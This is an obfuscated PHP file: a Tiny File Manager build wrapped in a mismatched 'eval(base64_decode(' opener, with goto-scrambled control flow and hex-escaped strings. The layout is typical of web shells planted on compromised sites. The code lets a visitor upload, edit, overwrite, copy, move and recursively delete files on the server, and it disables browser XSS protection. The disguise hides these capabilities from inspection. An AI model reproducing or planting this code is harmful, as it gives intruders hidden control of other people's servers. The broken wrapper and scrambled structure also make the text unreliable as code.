<?php eval(base64_decode('
 goto SUwTn; QWiCp: $readonly_users = array("\x61\143\164\x69\x76\x61"); goto HqjQy; HvThV: function fm_is_utf8($string) { return preg_match("\57\x2f\165", $string); } goto onRXj; EsgZ_: function fm_get_parent_path($path) { $path = fm_clean_path($path); if ($path != '') { $array = explode("\57", $path); if (count($array) > 1) { $array = array_slice($array, 0, -1); return implode("\57", $array); } return ''; } return false; } goto hh3pB; q1o1V: define("\106\115\137\124\x48\x45\115\105", $theme); goto Cubf3; p3idg: $show_hidden_files = isset($cfg->data["\x73\150\157\167\x5f\x68\x69\x64\144\145\x6e"]) ? $cfg->data["\x73\x68\x6f\x77\x5f\x68\151\x64\144\145\x6e"] : true; goto np4IS; np4IS: $report_errors = isset($cfg->data["\x65\x72\162\157\x72\137\x72\x65\160\x6f\x72\x74\151\x6e\x67"]) ? $cfg->data["\145\162\x72\157\162\x5f\162\x65\x70\157\162\164\x69\156\147"] : true; goto mp34R; skTge: echo $tableTheme; goto QfHXk; GYwg3: $iconv_input_encoding = "\x55\124\x46\x2d\x38"; goto UWFP8; onRXj: function fm_convert_win($filename) { if (FM_IS_WIN && function_exists("\151\143\x6f\156\x76")) { $filename = iconv(FM_ICONV_INPUT_ENC, "\125\124\x46\x2d\x38\57\57\x49\x47\x4e\117\x52\x45", $filename); } return $filename; } goto HDJgG; WUNGH: if (defined("\106\x4d\x5f\105\x4d\x42\x45\104")) { $use_auth = false; $sticky_navbar = false; } else { @set_time_limit(600); date_default_timezone_set($default_timezone); ini_set("\x64\x65\x66\x61\165\154\x74\137\x63\x68\141\162\x73\145\x74", "\125\x54\x46\x2d\x38"); if (version_compare(PHP_VERSION, "\65\x2e\66\56\60", "\74") && function_exists("\x6d\142\137\x69\x6e\164\x65\x72\156\x61\x6c\x5f\x65\156\143\x6f\x64\151\x6e\x67")) { mb_internal_encoding("\x55\x54\106\55\x38"); } if (function_exists("\x6d\x62\x5f\162\145\147\145\x78\x5f\x65\x6e\x63\157\144\151\156\147")) { mb_regex_encoding("\125\x54\x46\x2d\70"); } session_cache_limiter(''); session_name(FM_SESSION_ID); function session_error_handling_function($code, $msg, $file, $line) { if ($code == 2) { session_abort(); session_id(session_create_id()); @session_start(); } } set_error_handler("\x73\x65\163\163\x69\x6f\156\x5f\145\x72\162\157\162\x5f\x68\x61\x6e\x64\x6c\151\x6e\x67\137\146\x75\x6e\x63\164\x69\x6f\x6e"); session_start(); restore_error_handler(); } goto sJXPL; KFcCr: defined("\106\115\137\x45\130\103\x4c\125\x44\x45\x5f\111\x54\105\115\x53") || define("\106\x4d\x5f\105\x58\103\114\125\104\105\x5f\x49\x54\105\x4d\123", version_compare(PHP_VERSION, "\x37\56\60\56\x30", "\x3c") ? serialize($exclude_items) : $exclude_items); goto xiiiP; uPljZ: if (isset($_POST["\146\x69\x6c\x65"], $_POST["\143\x6f\x70\x79\x5f\164\157"], $_POST["\146\x69\x6e\151\163\150"]) && !FM_READONLY) { $path = FM_ROOT_PATH; if (FM_PATH != '') { $path .= "\57" . FM_PATH; } $copy_to_path = FM_ROOT_PATH; $copy_to = fm_clean_path($_POST["\143\x6f\160\x79\137\x74\157"]); if ($copy_to != '') { $copy_to_path .= "\57" . $copy_to; } if ($path == $copy_to_path) { fm_set_msg(lng("\x50\141\x74\x68\163\x20\x6d\165\163\x74\x20\142\x65\x20\x6e\x6f\164\40\145\x71\165\x61\x6c"), "\141\154\x65\x72\x74"); fm_redirect(FM_SELF_URL . "\77\160\x3d" . urlencode(FM_PATH)); } if (!is_dir($copy_to_path)) { if (!fm_mkdir($copy_to_path, true)) { fm_set_msg("\125\156\x61\142\x6c\145\x20\164\x6f\x20\143\162\145\141\164\x65\40\x64\145\163\x74\x69\156\141\164\x69\x6f\x6e\40\x66\x6f\x6c\x64\145\162", "\x65\x72\x72\157\162"); fm_redirect(FM_SELF_URL . "\77\160\75" . urlencode(FM_PATH)); } } $move = isset($_POST["\x6d\157\166\145"]); $errors = 0; $files = $_POST["\x66\151\154\145"]; if (is_array($files) && count($files)) { foreach ($files as $f) { if ($f != '') { $from = $path . "\x2f" . $f; $dest = $copy_to_path . "\57" . $f; if ($move) { $rename = fm_rename($from, $dest); if ($rename === false) { $errors++; } } else { if (!fm_rcopy($from, $dest)) { $errors++; } } } } if ($errors == 0) { $msg = $move ? "\x53\x65\x6c\x65\143\164\x65\x64\x20\x66\x69\x6c\145\x73\x20\x61\x6e\x64\40\146\157\x6c\144\x65\162\x73\40\x6d\x6f\x76\x65\x64" : "\x53\145\x6c\x65\143\x74\x65\x64\x20\146\x69\154\x65\x73\x20\141\156\x64\x20\x66\157\154\144\x65\x72\163\40\x63\x6f\160\151\x65\144"; fm_set_msg($msg); } else { $msg = $move ? "\x45\162\x72\157\x72\40\x77\x68\x69\154\145\40\155\157\x76\x69\x6e\x67\40\x69\164\145\x6d\x73" : "\x45\x72\x72\x6f\162\x20\x77\150\x69\x6c\145\x20\x63\x6f\x70\171\151\156\x67\40\x69\x74\145\x6d\x73"; fm_set_msg($msg, "\x65\162\162\x6f\162"); } } else { fm_set_msg(lng("\116\157\164\x68\151\156\x67\x20\x73\145\154\x65\143\x74\x65\144"), "\x61\x6c\145\x72\x74"); } fm_redirect(FM_SELF_URL . "\x3f\160\x3d" . urlencode(FM_PATH)); } goto KeBqA; N0tuE: function fm_rdelete($path) { if (is_link($path)) { return unlink($path); } elseif (is_dir($path)) { $objects = scandir($path); $ok = true; if (is_array($objects)) { foreach ($objects as $file) { if ($file != "\56" && $file != "\x2e\x2e") { if (!fm_rdelete($path . "\57" . $file)) { $ok = false; } } } } return $ok ? rmdir($path) : false; } elseif (is_file($path)) { return unlink($path); } return false; } goto xp1sz; C1J2I: $default_timezone = "\x45\164\143\57\x55\x54\x43"; goto um99G; AzmKV: define("\x46\115\137\x52\x45\101\104\117\x4e\114\x59", $use_auth && !empty($readonly_users) && isset($_SESSION[FM_SESSION_ID]["\154\x6f\147\x67\x65\x64"]) && in_array($_SESSION[FM_SESSION_ID]["\x6c\157\147\147\x65\144"], $readonly_users)); goto Qc4Fn; X7PMY: $highlightjs_style = "\166\x73"; goto C6kqg; MaRe1: if (!empty($_FILES) && !FM_READONLY) { $override_file_name = false; $f = $_FILES; $path = FM_ROOT_PATH; $ds = DIRECTORY_SEPARATOR; if (FM_PATH != '') { $path .= "\x2f" . FM_PATH; } $errors = 0; $uploads = 0; $allowed = FM_UPLOAD_EXTENSION ? explode("\x2c", FM_UPLOAD_EXTENSION) : false; $response = array("\163\x74\141\x74\x75\163" => "\x65\162\162\157\162", "\151\x6e\x66\157" => "\117\x6f\160\163\x21\40\x54\162\171\40\141\147\141\151\x6e"); $filename = $f["\x66\151\x6c\x65"]["\x6e\x61\155\145"]; $tmp_name = $f["\146\151\154\145"]["\164\155\160\x5f\x6e\x61\155\145"]; $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION)); $isFileAllowed = $allowed ? in_array($ext, $allowed) : true; if (!fm_isvalid_filename($filename) && !fm_isvalid_filename($_REQUEST["\x66\x75\x6c\x6c\x70\141\164\150"])) { $response = array("\x73\x74\141\x74\165\x73" => "\x65\x72\x72\x6f\162", "\151\x6e\146\157" => "\x49\156\x76\x61\154\151\x64\x20\106\x69\154\x65\x20\156\141\155\145\x21"); echo json_encode($response); die; } $targetPath = $path . $ds; if (is_writable($targetPath)) { $fullPath = $path . "\x2f" . str_replace("\56\x2f", "\x5f", $_REQUEST["\x66\165\x6c\154\x70\141\x74\150"]); $folder = substr($fullPath, 0, strrpos($fullPath, "\57")); if (file_exists($fullPath) && !$override_file_name) { $ext_1 = $ext ? "\x2e" . $ext : ''; $fullPath = str_replace($ext_1, '', $fullPath) . "\x5f" . date("\x79\155\x64\110\x69\x73") . $ext_1; } if (!is_dir($folder)) { $old = umask(0); mkdir($folder, 511, true); umask($old); } if (empty($f["\x66\x69\154\x65"]["\145\x72\162\x6f\x72"]) && !empty($tmp_name) && $tmp_name != "\156\x6f\156\x65" && $isFileAllowed) { if (move_uploaded_file($tmp_name, $fullPath)) { if (file_exists($fullPath)) { $response = array("\163\x74\x61\164\x75\163" => "\163\x75\x63\x63\145\x73\x73", "\x69\156\x66\x6f" => "\x66\151\154\145\40\x75\x70\154\157\141\x64\40\163\165\x63\x63\x65\163\x73\146\x75\154"); } else { $response = array("\x73\164\x61\x74\165\163" => "\145\162\162\x6f\162", "\151\x6e\x66\x6f" => "\x43\x6f\165\154\x64\156\x27\x74\40\x75\160\x6c\x6f\141\144\x20\164\x68\145\40\162\x65\161\165\x65\163\164\145\x64\x20\146\151\x6c\145\56"); } } else { $response = array("\163\164\x61\164\165\163" => "\x65\162\x72\157\x72", "\x69\x6e\146\x6f" => "\x45\x72\x72\x6f\x72\40\167\x68\x69\x6c\145\x20\x75\160\x6c\x6f\x61\x64\x69\156\x67\40\x66\151\154\x65\x73\56\x20\x55\160\x6c\157\141\144\145\144\40\146\151\x6c\x65\x73\40{$uploads}"); } } } else { $response = array("\x73\164\x61\164\165\x73" => "\145\x72\162\157\162", "\151\156\x66\157" => "\x54\x68\x65\x20\x73\x70\x65\x63\151\x66\151\145\144\x20\x66\157\154\144\x65\162\x20\146\157\x72\x20\x75\x70\x6c\157\x61\x64\x20\151\x73\156\x27\164\40\167\x72\151\x74\x65\141\x62\x6c\x65\56"); } echo json_encode($response); die; } goto llm7n; L8CJK: function fm_set_msg($msg, $status = "\157\x6b") { $_SESSION[FM_SESSION_ID]["\x6d\x65\x73\163\141\147\145"] = $msg; $_SESSION[FM_SESSION_ID]["\163\164\141\164\x75\163"] = $status; } goto HvThV; HqjQy: $use_highlightjs = true; goto X7PMY; zjtZN: ?>
                    <th><?php  goto dv8xf; NrVzR: $input = file_get_contents("\x70\x68\160\x3a\57\x2f\151\156\x70\x75\x74"); goto oG9eX; cXZ_L: if (isset($_GET["\145\144\x69\164"])) { $file = $_GET["\x65\x64\151\x74"]; $file = fm_clean_path($file, false); $file = str_replace("\57", '', $file); if ($file == '' || !is_file($path . "\57" . $file)) { fm_set_msg(lng("\106\151\x6c\145\40\156\x6f\164\40\146\157\165\x6e\144"), "\145\162\x72\157\162"); fm_redirect(FM_SELF_URL . "\x3f\x70\x3d" . urlencode(FM_PATH)); } header("\x58\55\130\x53\123\55\x50\x72\x6f\164\x65\143\x74\151\157\156\x3a\60"); fm_show_header(); fm_show_nav_path(FM_PATH); $file_url = FM_ROOT_URL . fm_convert_win((FM_PATH != '' ? "\x2f" . FM_PATH : '') . "\57" . $file); $file_path = $path . "\57" . $file; $isNormalEditor = true; if (isset($_GET["\145\x6e\x76"])) { if ($_GET["\x65\156\x76"] == "\x61\x63\x65") { $isNormalEditor = false; } } if (isset($_POST["\163\141\166\145\144\x61\164\141"])) { $writedata = $_POST["\163\x61\x76\x65\144\x61\x74\x61"]; $fd = fopen($file_path, "\167"); @fwrite($fd, $writedata); fclose($fd); fm_set_msg(lng("\106\151\154\145\x20\123\x61\x76\145\144\x20\x53\x75\143\143\x65\163\163\x66\165\154\x6c\x79")); } $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION)); $mime_type = fm_get_mime_type($file_path); $filesize = filesize($file_path); $is_text = false; $content = ''; if (in_array($ext, fm_get_text_exts()) || substr($mime_type, 0, 4) == "\164\145\170\x74" || in_array($mime_type, fm_get_text_mimes())) { $is_text = true; $content = file_get_contents($file_path); } ?>
    <div class="path">
        <div class="row">
            <div class="col-xs-12 col-sm-5 col-lg-6 pt-1">
                <div class="btn-toolbar" role="toolbar">
                    <?php  if (!$isNormalEditor) { ?>
                        <div class="btn-group js-ace-toolbar">
                            <button data-cmd="none" data-option="fullscreen" class="btn btn-sm btn-outline-secondary" id="js-ace-fullscreen" title="Fullscreen"><i class="fa fa-expand" title="Fullscreen"></i></button>
                            <button data-cmd="find" class="btn btn-sm btn-outline-secondary" id="js-ace-search" title="Search"><i class="fa fa-search" title="Search"></i></button>
                            <button data-cmd="undo" class="btn btn-sm btn-outline-secondary" id="js-ace-undo" title="Undo"><i class="fa fa-undo" title="Undo"></i></button>
                            <button data-cmd="redo" class="btn btn-sm btn-outline-secondary" id="js-ace-redo" title="Redo"><i class="fa fa-repeat" title="Redo"></i></button>
                            <button data-cmd="none" data-option="wrap" class="btn btn-sm btn-outline-secondary" id="js-ace-wordWrap" title="Word Wrap"><i class="fa fa-text-width" title="Word Wrap"></i></button>
                            <button data-cmd="none" data-option="help" class="btn btn-sm btn-outline-secondary" id="js-ace-goLine" title="Help"><i class="fa fa-question" title="Help"></i></button>
                            <select id="js-ace-mode" data-type="mode" title="Select Document Type" class="btn-outline-secondary border-left-0 d-none d-md-block"><option>-- Select Mode --</option></select>
                            <select id="js-ace-theme" data-type="theme" title="Select Theme" class="btn-outline-secondary border-left-0 d-none d-lg-block"><option>-- Select Theme --</option></select>
                            <select id="js-ace-fontSize" data-type="fontSize" title="Select Font Size" class="btn-outline-secondary border-left-0 d-none d-lg-block"><option>-- Select Font Size --</option></select>
                        </div>
                    <?php  } ?>
                </div>
            </div>
            <div class="edit-file-actions col-xs-12 col-sm-7 col-lg-6 text-right pt-1">
                <a title="<?php  echo lng("\x42\x61\143\153"); ?>
" class="btn btn-sm btn-outline-primary" href="?p=<?php  echo urlencode(trim(FM_PATH)); ?>
&amp;view=<?php  echo urlencode($file); ?>
"><i class="fa fa-reply-all"></i> <?php  echo lng("\x42\x61\143\x6b"); ?>
</a>
                <a title="<?php  echo lng("\x42\141\x63\x6b\125\x70"); ?>
" class="btn btn-sm btn-outline-primary" href="javascript:void(0);" onclick="backup('<?php  echo urlencode(trim(FM_PATH)); ?>
','<?php  echo urlencode($file); ?>
')"><i class="fa fa-database"></i> <?php  echo lng("\102\141\143\153\x55\x70"); ?>
</a>
                <?php  if ($is_text) { ?>
                    <?php  if ($isNormalEditor) { ?>
                        <a title="Advanced" class="btn btn-sm btn-outline-primary" href="?p=<?php  echo urlencode(trim(FM_PATH)); ?>
&amp;edit=<?php  echo urlencode($file); ?>
&amp;env=ace"><i class="fa fa-pencil-square-o"></i> <?php  echo lng("\x41\144\x76\141\x6e\x63\145\144\x45\144\151\164\x6f\x72"); ?>
</a>
                        <button type="button" class="btn btn-sm btn-outline-primary name="Save" data-url="<?php  echo fm_enc($file_url); ?>
" onclick="edit_save(this,'nrl')"><i class="fa fa-floppy-o"></i> Save
                        </button>
                    <?php  } else { ?>
                        <a title="Plain Editor" class="btn btn-sm btn-outline-primary" href="?p=<?php  echo urlencode(trim(FM_PATH)); ?>
&amp;edit=<?php  echo urlencode($file); ?>
"><i class="fa fa-text-height"></i> <?php  echo lng("\x4e\x6f\x72\x6d\x61\x6c\x45\x64\x69\164\x6f\x72"); ?>
</a>
                        <button type="button" class="btn btn-sm btn-outline-primary" name="Save" data-url="<?php  echo fm_enc($file_url); ?>
" onclick="edit_save(this,'ace')"><i class="fa fa-floppy-o"></i> <?php  echo lng("\123\141\166\145"); ?>
                        </button>
                    <?php  } ?>
                <?php  } ?>
            </div>
        </div>
        <?php  if ($is_text && $isNormalEditor) { echo "\x3c\x74\145\x78\x74\x61\x72\x65\x61\x20\x63\x6c\x61\x73\x73\x3d\42\x6d\x74\55\x32\42\x20\x69\144\x3d\x22\156\x6f\x72\155\x61\154\x2d\145\x64\x69\x74\x6f\162\x22\40\162\x6f\x77\163\75\42\63\x33\x22\40\x63\157\x6c\x73\75\x22\x31\x32\60\x22\x20\x73\x74\x79\154\x65\x3d\x22\x77\151\x64\x74\150\72\x20\x39\71\x2e\65\45\73\x22\x3e" . htmlspecialchars($content) . "\74\x2f\x74\145\170\x74\x61\162\x65\141\x3e"; } elseif ($is_text) { echo "\74\144\151\x76\40\151\144\75\42\145\144\151\x74\157\162\42\40\143\157\156\x74\x65\x6e\x74\145\x64\x69\x74\141\x62\154\x65\75\42\x74\162\165\145\42\76" . htmlspecialchars($content) . "\x3c\57\144\x69\x76\x3e"; } else { fm_set_msg(lng("\x46\x49\x4c\105\x20\x45\130\x54\105\x4e\123\x49\x4f\116\40\110\x41\123\x20\x4e\x4f\x54\x20\123\x55\120\120\117\122\124\x45\x44"), "\x65\x72\x72\x6f\162"); } ?>
    </div>
    <?php  fm_show_footer(); die; } goto S1aV3; GZopX: $ip_silent = true; goto XNNNU; RXaJB: defined("\x46\x4d\137\x52\117\117\x54\137\120\x41\124\110") || define("\106\115\137\122\117\x4f\124\137\x50\101\124\x48", $root_path); goto cCS4W; B5hLn: function scan($dir, $filter = '') { $path = FM_ROOT_PATH . "\57" . $dir; if ($dir) { $ite = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path)); $rii = new RegexIterator($ite, "\57\x28" . $filter . "\x29\57\x69"); $files = array(); foreach ($rii as $file) { if (!$file->isDir()) { $fileName = $file->getFilename(); $location = str_replace(FM_ROOT_PATH, '', $file->getPath()); $files[] = array("\x6e\141\x6d\x65" => $fileName, "\164\x79\x70\145" => "\146\151\x6c\x65", "\x70\x61\164\x68" => $location); } } return $files; } } goto jxFIX; ZdAij: if (isset($_GET["\163\145\x74\164\151\156\147\x73"]) && !FM_READONLY) { fm_show_header(); fm_show_nav_path(FM_PATH); global $cfg, $lang, $lang_list; ?>

    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2 <?php  echo fm_get_theme(); ?>
">
            <h6 class="card-header">
                <i class="fa fa-cog"></i>  <?php  echo lng("\x53\x65\x74\x74\x69\x6e\x67\x73"); ?>
                <a href="?p=<?php  echo FM_PATH; ?>
" class="float-right"><i class="fa fa-window-close"></i> <?php  echo lng("\x43\x61\x6e\x63\x65\154"); ?>
</a>
            </h6>
            <div class="card-body">
                <form id="js-settings-form" action="" method="post" data-type="ajax" onsubmit="return save_settings(this)">
                    <input type="hidden" name="type" value="settings" aria-label="hidden" aria-hidden="true">
                    <div class="form-group row">
                        <label for="js-language" class="col-sm-3 col-form-label"><?php  echo lng("\114\141\x6e\147\165\x61\147\145"); ?>
</label>
                        <div class="col-sm-5">
                            <select class="form-control" id="js-language" name="js-language">
                                <?php  function getSelected($l) { global $lang; return $lang == $l ? "\163\145\x6c\x65\x63\164\x65\x64" : ''; } foreach ($lang_list as $k => $v) { echo "\74\x6f\x70\164\x69\x6f\x6e\x20\166\141\154\x75\145\75\x27{$k}\x27\x20" . getSelected($k) . "\76{$v}\x3c\57\157\160\x74\x69\x6f\x6e\x3e"; } ?>
                            </select>
                        </div>
                    </div>
                    <?php  function getChecked($conf, $val, $txt) { if ($conf == 1 && $val == 1) { return $txt; } else { if ($conf == '' && $val == '') { return $txt; } else { return ''; } } } ?>
                    <div class="form-group row">
                        <label for="js-err-rpt-1" class="col-sm-3 col-form-label"><?php  echo lng("\x45\x72\x72\x6f\x72\x52\145\160\157\162\164\x69\156\147"); ?>
</label>
                        <div class="col-sm-9">
                            <div class="btn-group btn-group-toggle" data-toggle="buttons">
                                <label class="btn btn-secondary <?php  echo getChecked($report_errors, 1, "\141\143\x74\151\x76\x65"); ?>
">
                                    <input type="radio" name="js-error-report" id="js-err-rpt-1" autocomplete="off" value="true" <?php  echo getChecked($report_errors, 1, "\143\150\145\x63\153\145\x64"); ?>
 > ON
                                </label>
                                <label class="btn btn-secondary <?php  echo getChecked($report_errors, '', "\x61\x63\x74\151\x76\145"); ?>
">
                                    <input type="radio" name="js-error-report" id="js-err-rpt-0" autocomplete="off" value="false" <?php  echo getChecked($report_errors, '', "\143\x68\145\143\153\145\x64"); ?>
 > OFF
                                </label>
                            </div>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label for="js-hdn-1" class="col-sm-3 col-form-label"><?php  echo lng("\x53\150\x6f\x77\x48\x69\144\x64\x65\x6e\x46\x69\154\x65\163"); ?>
</label>
                        <div class="col-sm-9">
                            <div class="btn-group btn-group-toggle" data-toggle="buttons">
                                <label class="btn btn-secondary <?php  echo getChecked($show_hidden_files, 1, "\141\x63\164\151\x76\x65"); ?>
">
                                    <input type="radio" name="js-show-hidden" id="js-hdn-1" autocomplete="off" value="true" <?php  echo getChecked($show_hidden_files, 1, "\x63\x68\x65\143\x6b\x65\144"); ?>
 > ON
                                </label>
                                <label class="btn btn-secondary <?php  echo getChecked($show_hidden_files, '', "\141\143\164\151\x76\x65"); ?>
">
                                    <input type="radio" name="js-show-hidden" id="js-hdn-0" autocomplete="off" value="false" <?php  echo getChecked($show_hidden_files, '', "\143\x68\145\143\153\x65\144"); ?>
 > OFF
                                </label>
                            </div>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label for="js-hid-1" class="col-sm-3 col-form-label"><?php  echo lng("\110\151\x64\145\x43\x6f\x6c\x75\x6d\156\x73"); ?>
</label>
                        <div class="col-sm-9">
                            <div class="btn-group btn-group-toggle" data-toggle="buttons">
                                <label class="btn btn-secondary <?php  echo getChecked($hide_Cols, 1, "\141\143\164\151\166\145"); ?>
">
                                    <input type="radio" name="js-hide-cols" id="js-hid-1" autocomplete="off" value="true" <?php  echo getChecked($hide_Cols, 1, "\143\150\x65\x63\153\x65\144"); ?>
 > ON
                                </label>
                                <label class="btn btn-secondary <?php  echo getChecked($hide_Cols, '', "\x61\x63\x74\x69\166\145"); ?>
">
                                    <input type="radio" name="js-hide-cols" id="js-hid-0" autocomplete="off" value="false" <?php  echo getChecked($hide_Cols, '', "\143\x68\145\143\x6b\x65\x64"); ?>
 > OFF
                                </label>
                            </div>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label for="js-dir-1" class="col-sm-3 col-form-label"><?php  echo lng("\x43\141\x6c\143\165\x6c\x61\x74\x65\106\x6f\154\144\145\162\123\x69\172\145"); ?>
</label>
                        <div class="col-sm-9">
                            <div class="btn-group btn-group-toggle" data-toggle="buttons">
                                <label class="btn btn-secondary <?php  echo getChecked($calc_folder, 1, "\x61\143\164\151\x76\145"); ?>
">
                                    <input type="radio" name="js-calc-folder" id="js-dir-1" autocomplete="off" value="true" <?php  echo getChecked($calc_folder, 1, "\143\x68\x65\143\x6b\x65\x64"); ?>
 > ON
                                </label>
                                <label class="btn btn-secondary <?php  echo getChecked($calc_folder, '', "\141\143\x74\x69\166\x65"); ?>
">
                                    <input type="radio" name="js-calc-folder" id="js-dir-0" autocomplete="off" value="false" <?php  echo getChecked($calc_folder, '', "\x63\x68\145\143\153\145\x64"); ?>
 > OFF
                                </label>
                            </div>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label for="js-3-1" class="col-sm-3 col-form-label"><?php  echo lng("\x54\x68\145\x6d\x65"); ?>
</label>
                        <div class="col-sm-5">
                            <select class="form-control" id="js-3-0" name="js-theme-3" style="width:100px;">
                                <option value='light' <?php  if ($theme == "\x6c\x69\147\150\x74") { echo "\163\x65\x6c\145\143\x74\x65\144"; } ?>
><?php  echo lng("\154\151\x67\150\164"); ?>
</option>
                                <option value='dark' <?php  if ($theme == "\144\141\162\x6b") { echo "\163\x65\154\145\143\164\145\x64"; } ?>
><?php  echo lng("\x64\141\x72\x6b"); ?>
</option>
                            </select>
                        </div>
                    </div>

                    <div class="form-group row">
                        <div class="col-sm-10">
                            <button type="submit" class="btn btn-success"> <i class="fa fa-check-circle"></i> <?php  echo lng("\x53\141\x76\x65"); ?>
</button>
                        </div>
                    </div>

                </form>
            </div>
        </div>
    </div>
    <?php  fm_show_footer(); die; } goto Ddlqy; VT2Of: $online_viewer = "\x67\x6f\x6f\x67\154\x65"; goto dg5fv; H7jy2: fm_show_nav_path(FM_PATH); goto lnfR_; CakGU: function fm_get_text_names() { return array("\x6c\151\x63\x65\156\163\x65", "\x72\145\141\144\155\x65", "\141\165\164\x68\x6f\x72\163", "\143\x6f\156\164\x72\151\142\165\x74\x6f\162\163", "\x63\x68\141\x6e\x67\145\x6c\157\x67"); } goto ViG09; lm3KI: echo lng("\x53\x69\172\x65"); goto p61sN; olkgN: echo lng("\116\141\x6d\x65"); goto kczpk; wc9uj: if (isset($_GET["\x64\x65\154"]) && !FM_READONLY) { $del = str_replace("\57", '', fm_clean_path($_GET["\144\145\154"])); if ($del != '' && $del != "\x2e\56" && $del != "\x2e") { $path = FM_ROOT_PATH; if (FM_PATH != '') { $path .= "\x2f" . FM_PATH; } $is_dir = is_dir($path . "\57" . $del); if (fm_rdelete($path . "\57" . $del)) { $msg = $is_dir ? lng("\106\157\154\x64\145\x72") . "\x20\x3c\142\76\45\x73\x3c\x2f\142\x3e\40" . lng("\x44\145\x6c\x65\164\x65\x64") : lng("\x46\x69\x6c\145") . "\40\74\x62\76\45\163\74\x2f\x62\x3e\40" . lng("\x44\x65\154\x65\164\145\x64"); fm_set_msg(sprintf($msg, fm_enc($del))); } else { $msg = $is_dir ? lng("\x46\x6f\x6c\144\145\162") . "\x20\x3c\x62\x3e\45\163\x3c\x2f\142\x3e\40" . lng("\156\x6f\x74\x20\144\145\154\x65\164\145\144") : lng("\x46\151\x6c\145") . "\40\74\x62\x3e\45\163\x3c\57\x62\76\x20" . lng("\156\157\x74\40\144\145\x6c\x65\164\x65\x64"); fm_set_msg(sprintf($msg, fm_enc($del)), "\145\162\162\x6f\x72"); } } else { fm_set_msg(lng("\x49\156\166\x61\x6c\x69\144\40\146\x69\x6c\x65\x20\x6f\x72\x20\146\157\154\x64\x65\162\40\156\141\155\x65"), "\145\162\x72\157\x72"); } fm_redirect(FM_SELF_URL . "\x3f\160\75" . urlencode(FM_PATH)); } goto NSjIC; Gp8k_: define("\106\115\137\120\x41\124\x48", $p); goto Xqjlc; di2vM: function fm_get_translations($tr) { try { $content = @file_get_contents("\164\162\141\x6e\163\x6c\141\164\x69\157\156\x2e\x6a\163\157\x6e"); if ($content !== FALSE) { $lng = json_decode($content, TRUE); global $lang_list; foreach ($lng["\x6c\141\156\147\x75\141\147\145"] as $key => $value) { $code = $value["\x63\157\x64\145"]; $lang_list[$code] = $value["\156\141\x6d\145"]; if ($tr) { $tr[$code] = $value["\x74\162\x61\x6e\x73\x6c\141\164\x69\157\156"]; } } return $tr; } } catch (Exception $e) { echo $e; } } goto KFtem; qqiIN: $allowed_file_extensions = ''; goto ivbU5; Ddlqy: if (isset($_GET["\x68\x65\x6c\160"])) { fm_show_header(); fm_show_nav_path(FM_PATH); global $cfg, $lang; ?>

    <div class="col-md-8 offset-md-2 pt-3">
        <div class="card mb-2 <?php  echo fm_get_theme(); ?>
">
            <h6 class="card-header">
                <i class="fa fa-exclamation-circle"></i> <?php  echo lng("\110\x65\154\160"); ?>
                <a href="?p=<?php  echo FM_PATH; ?>
" class="float-right"><i class="fa fa-window-close"></i> <?php  echo lng("\103\141\x6e\143\x65\x6c"); ?>
</a>
            </h6>
            <div class="card-body">
                <div class="row">
                    <div class="col-xs-12 col-sm-6">
                        <p><h3><a href="https://github.com/prasathmani/tinyfilemanager" target="_blank" class="app-v-title"> Tiny File Manager <?php  echo VERSION; ?>
</a></h3></p>
                        <p>Author: Prasath Mani</p>
                        <p>Mail Us: <a href="mailto:ccpprogrammers@gmail.com">ccpprogrammers[at]gmail.com</a> </p>
                    </div>
                    <div class="col-xs-12 col-sm-6">
                        <div class="card">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="https://github.com/prasathmani/tinyfilemanager/wiki" target="_blank"><i class="fa fa-question-circle"></i> <?php  echo lng("\x48\145\154\x70\40\104\x6f\143\x75\155\145\156\164\163"); ?>
 </a> </li>
                                <li class="list-group-item"><a href="https://github.com/prasathmani/tinyfilemanager/issues" target="_blank"><i class="fa fa-bug"></i> <?php  echo lng("\122\x65\160\x6f\162\x74\x20\x49\163\x73\165\145"); ?>
</a></li>
                                <li class="list-group-item"><a href="javascript:latest_release_info('<?php  echo VERSION; ?>
');"><i class="fa fa-link"> </i> <?php  echo lng("\x43\x68\145\143\153\40\x4c\141\164\x65\163\164\x20\126\145\162\x73\x69\x6f\x6e"); ?>
</a></li>
                                <?php  if (!FM_READONLY) { ?>
                                    <li class="list-group-item"><a href="javascript:show_new_pwd();"><i class="fa fa-lock"></i> <?php  echo lng("\x47\x65\156\x65\x72\x61\164\x65\x20\x6e\145\x77\x20\x70\141\163\x73\167\157\x72\x64\x20\x68\x61\x73\150"); ?>
</a></li>
                                <?php  } ?>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="row js-new-pwd hidden mt-2">
                    <div class="col-12">
                        <form class="form-inline" onsubmit="return new_password_hash(this)" method="POST" action="">
                            <input type="hidden" name="type" value="pwdhash" aria-label="hidden" aria-hidden="true">
                            <div class="form-group mb-2">
                                <label for="staticEmail2"><?php  echo lng("\107\145\x6e\x65\x72\141\164\x65\40\x6e\145\167\40\160\141\163\163\167\x6f\x72\144\40\150\141\x73\x68"); ?>
</label>
                            </div>
                            <div class="form-group mx-sm-3 mb-2">
                                <label for="inputPassword2" class="sr-only"><?php  echo lng("\120\x61\163\x73\167\x6f\162\x64"); ?>
</label>
                                <input type="text" class="form-control btn-sm" id="inputPassword2" name="inputPassword2" placeholder="Password" required>
                            </div>
                            <button type="submit" class="btn btn-success btn-sm mb-2"><?php  echo lng("\107\145\156\x65\x72\141\164\145"); ?>
</button>
                        </form>
                        <textarea class="form-control" rows="2" readonly id="js-pwd-result"></textarea>
                    </div>
                </div>
            </div>
        </div>
    </div>
